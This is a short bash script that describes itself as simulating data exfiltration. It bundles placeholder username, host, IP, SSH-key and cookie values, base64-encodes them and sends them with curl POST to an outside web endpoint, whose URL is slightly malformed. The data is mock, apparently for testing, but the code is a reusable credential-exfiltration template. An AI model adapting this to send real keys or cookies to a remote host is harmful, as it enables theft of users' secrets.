#!/bin/bash
# malicious payload script to simulate data exfiltration to a cloudflare endpoint

# simulated sensitive data (replace these with test data for safety)
username="test_user"
hostname="test_machine"
ip_address="192.168.1.1"
ssh_keys="mock_ssh_key"
browser_cookies="mock_cookies"

# package the data
payload="USER=$username HOST=$hostname IP=$ip_address SSH_KEYS=$ssh_keys COOKIES=$browser_cookies"
encoded_payload=$(echo $payload | base64)

# exfiltrate the data to the cloudflare pages endpoint
curl -X POST -H "Content-Type: application/json" \
     -d "{\"data\":\"$encoded_payload\"}" \
     https://masonmelead.com>/api/log

# clean up traces (for simulation, this does nothing harmful)
echo "Test payload sent to Cloudflare Pages"